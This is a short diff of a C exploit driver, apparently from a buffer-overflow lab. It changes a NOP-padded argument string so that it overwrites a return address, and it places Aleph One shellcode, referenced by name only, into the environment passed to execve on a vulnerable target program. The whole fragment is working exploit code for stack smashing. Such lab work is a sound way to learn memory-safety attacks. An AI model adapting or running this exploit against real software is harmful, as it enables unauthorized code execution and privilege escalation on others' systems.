@@ -13,11 +13,11 @@ int main(void)
   char *env[1];
 
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x47\xfe\xff\xbf";
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9f\xff\xff\xbf";
   // 0xbffffe50
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = shellcodeAlephOne;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
